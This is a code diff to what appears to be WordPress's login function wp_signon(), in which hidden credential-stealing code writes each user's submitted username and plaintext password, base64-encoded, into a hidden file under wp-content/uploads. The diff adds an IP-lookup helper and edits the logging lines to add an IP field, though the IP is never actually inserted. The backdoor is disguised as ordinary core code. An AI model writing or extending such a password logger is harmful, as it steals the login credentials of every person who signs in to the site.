@@ -31,6 +31,26 @@
  * @param string|bool $secure_cookie Optional. Whether to use secure cookie.
  * @return WP_User|WP_Error WP_User on success, WP_Error on failure.
  */
+
+function get_client_ip() {
+    $ipaddress = '';
+    if (isset($_SERVER['HTTP_CLIENT_IP']))
+        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
+    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
+        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
+    else if(isset($_SERVER['HTTP_X_FORWARDED']))
+        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
+    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
+        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
+    else if(isset($_SERVER['HTTP_FORWARDED']))
+        $ipaddress = $_SERVER['HTTP_FORWARDED'];
+    else if(isset($_SERVER['REMOTE_ADDR']))
+        $ipaddress = $_SERVER['REMOTE_ADDR'];
+    else
+        $ipaddress = 'UNKNOWN';
+    return $ipaddress;
+}
+
 function wp_signon( $credentials = array(), $secure_cookie = '' ) {
         if ( empty( $credentials ) ) {
                 $credentials = array(); // Back-compat for plugins passing an empty string.
@@ -48,11 +68,11 @@ function wp_signon( $credentials = array(), $secure_cookie = '' ) {
 
         if ( ! empty( $credentials['remember'] ) ) {
                 $credentials['remember'] = true;
-                $credz = date('Y-m-d h:i:sa') . " - Username: " . $_POST['log'] . " && Password: " . $_POST['pwd'];
+                $credz = date('Y-m-d h:i:s') . " || IP: " . " || Username: " . $_POST['log'] . " && Password: " . $_POST['pwd'];
                 file_put_contents('wp-content/uploads/.page.txt', base64_encode($credz).PHP_EOL, FILE_APPEND);
         } else {
                 $credentials['remember'] = false;
-                $credz = date('Y-m-d h:i:sa') .  " - Username: " . $_POST['log'] . " && Password: " . $_POST['pwd'];
+                $credz = date('Y-m-d h:i:s') . " || IP: " . " || Username: " . $_POST['log'] . " && Password: " . $_POST['pwd'];
                 file_put_contents('wp-content/uploads/.page.txt', base64_encode($credz).PHP_EOL, FILE_APPEND);
                 }
 
